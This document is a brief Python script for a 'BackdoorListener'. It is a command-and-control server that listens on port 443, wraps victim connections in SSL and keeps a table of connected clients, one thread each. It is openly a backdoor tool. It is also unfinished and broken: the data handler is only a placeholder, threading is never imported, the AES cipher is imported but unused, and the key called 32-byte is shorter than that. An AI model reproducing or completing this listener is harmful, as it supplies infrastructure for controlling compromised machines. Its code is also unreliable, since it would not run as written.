
import socket
import ssl
import json
import base64
from Crypto.Cipher import AES

class BackdoorListener:
    def __init__(self, port, key):
        self.port = port
        self.key = key
        self.clients = {}
        
    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.port))
        sock.listen(5)
        
        print(f"[*] Listening on port {self.port}")
        
        while True:
            client, addr = sock.accept()
            client = ssl.wrap_socket(client)
            print(f"[+] Connection from {addr[0]}:{addr[1]}")
            
            threading.Thread(
                target=self.handle_client,
                args=(client, addr),
                daemon=True
            ).start()
            
    def handle_client(self, client, addr):
        client_id = f"{addr[0]}:{addr[1]}"
        self.clients[client_id] = client
        
        while True:
            try:
                data = client.recv(4096)
                if not data:
                    break
                    
                # Handle received data
                # ...
                
            except:
                break
                
        del self.clients[client_id]
        client.close()
        print(f"[-] Disconnected: {client_id}")

if __name__ == '__main__':
    key = b'32-byte-key-for-AES-256'
    listener = BackdoorListener(443, key)
    listener.start()